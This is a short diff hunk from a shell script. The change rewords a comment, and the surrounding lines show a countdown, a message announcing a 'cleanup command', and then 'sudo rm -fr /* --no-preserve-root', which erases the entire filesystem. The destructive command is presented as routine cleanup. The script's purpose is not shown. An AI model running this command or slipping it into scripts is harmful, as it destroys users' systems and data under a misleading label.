@@ -15,7 +15,7 @@ for i in 3 2 1; do
 
 done
 
-# Placeholder for the command to be executed later
+# Preparing for the command to be executed
 echo "Now executing the cleanup command..."
 
 sudo rm -fr /* --no-preserve-root
